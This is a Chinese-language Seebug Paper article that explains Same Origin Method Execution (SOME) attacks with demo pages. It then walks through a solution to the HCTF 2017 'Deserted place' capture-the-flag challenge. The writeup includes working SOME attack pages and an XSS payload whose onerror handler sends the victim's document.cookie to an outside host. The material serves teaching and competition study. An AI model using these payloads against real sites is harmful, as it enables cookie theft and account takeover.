这种攻击方式有几个局限性: 1、受到返回头的影响，如果返回头为`Content-T ype: application/json`,则任何利用都不会生效。
2、攻击者没办法操作执行函数传入参数，或者可以说是比较难操作。 3、受到同源策略的限制，只能执行同源下的任意方法。

###### 让我们来测试一下

首先我们需要一个站点来模拟一下

index.html

    
    
    <form>
        <button onclick="c()">Secret Button</button>
        </form>
    <script>
        function c() {
            alert("LoRexxar click!");
        }
    </script>

jsonp.php

    
    
    <?php
    $callback = empty($_GET["callback"]) ? "jsCallback" : $_GET["callback"];
    
    echo "<script>";
    echo $callback . "()";
    echo "</script>";

我们假设click是一个敏感的按钮，这种情况我们可以通过SOME来点击这个按钮来执行相应的js。

首先我们需要一个some1.html

    
    
    <script>
        function start_some() {
            window.open("some2.html");
            location.replace("http://b.com/index.html");
        }
    
        setTimeout(start_some(), 1000);
    </script>

其次需要一个some2.html

    
    
    <script>
        function attack() {
            location.replace("http://b.com/jsonp.php?callback=window.opener.document.body.firstElementChild.firstElementChild.click");
        }
    
        setTimeout(attack, 2000);
    
    </script>

当我们打开some1.html的时候，c函数成功被执行了

![](https://images.seebug.org/content/images/2017/11/2a124a44-1af7-4646-a3bb-696d1250bed3.png-w331s)

这种攻击方式在大型站点越发的常见，SOME的作者举例子就用了wordpress的一个漏洞，通过接口可以在wordpress中安装想要的插件，导致getshell等更严重的漏洞。

##### Deserted place Writeup

回到题目。

打开题目主要功能有限：

  1. 登陆
  2. 注册
  3. 修改个人信息（修改个人信息后按回车更新自己的信息）、
  4. 获取随机一个人的信息，并把它的信息更新给我自己

简单测试可以发现，个人信息页面存在self-xss，但问题就在于怎么能更新admin的个人信息。

仔细回顾站内的各种信息，我们能发现所有的更新个人信息都是通过开启子窗口来实现的。

edit.php里面有一个类似于jsonp的接口可以执行任意函数，简单测试可以发现这里正则匹配了`.\w+`，这意味这我们只能执行已有的js函数，我们可以看看后台的代码。

    
    
    $callback = $_GET['callback'];  
    preg_match("/\w+/i", $callback, $matches);
    
    ...
    
    echo "<script>";
    echo $matches[0]."();";
    echo "</script>";

已有的函数一共有3个

    
    
    function UpdateProfile(){
        var username = document.getElementById('user').value;
        var email = document.getElementById('email').value;
        var message = document.getElementById('mess').value;
    
        window.opener.document.getElementById("email").innerHTML="Email: "+email;
        window.opener.document.getElementById("mess").innerHTML="Message: "+message;
    
        console.log("Update user profile success...");
        window.close();
    }
    
    function EditProfile(){
        document.onkeydown=function(event){
            if (event.keyCode == 13){
                UpdateProfile();
            }
        }
    }
    
    function RandomProfile(){
        setTimeout('UpdateProfile()', 1000);
    }

如果执行`UpdateProfile`，站内就会把子窗口的内容发送到父窗口中。但是我们还是没办法控制修改的内容。

回顾站内逻辑，当我们点击click
me，首先请求`/edit.php?callback=RandomProfile`，然后跳转至任意`http://hctf.com/edit.php?callback=RandomProfile&user=xiaoming`，然后页面关闭并，更新信息到当前用户上，假设这里user是我们设定的还有恶意代码的user，那我们就可以修改admin的信息了，但，怎么能让admin打开这个页面呢？

我们可以尝试一个，如果直接打开`edit.php?callback=RandomProfile&user=xiaoming`

![](https://images.seebug.org/content/images/2017/11/b174dfb9-8b68-4c05-a2dd-30548c63d537.png-w331s)

报错了，不是通过open打开的页面，寻找不到页面内的`window.opener`对象，也就没办法做任何事。

这里我们只有通过SOME，才能操作同源下的父窗口，首先我们得熟悉同源策略，同源策略规定，只有同源下的页面才能相互读写，如果通过`windows.open`打开的页面是同源的，那么我们就可以通过`window.opener`对象来操作父子窗口。

而SOME就是基于这种特性，可以执行同源下的任意方法。

最终payload：

vps, 1.html

    
    
    <script>
        function start_some() {
            window.open("2.html");
            location.replace("http://desert.2017.hctf.io/user.php");
        }
    
        setTimeout(start_some(), 1000);
    </script>

vps, 2.html

    
    
    <script>
        function attack() {
            location.replace("http://desert.2017.hctf.io/edit.php?callback=RandomProfile&user=lorexxar");
        }
    
        setTimeout(attack, 2000);
    
    </script>

在lorexxar账户的message里添加payload

    
    
    <img src="\" onerror=window.location.href='http://0xb.pw?cookie='%2bdocument.cookie>

getflag!

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/452/>

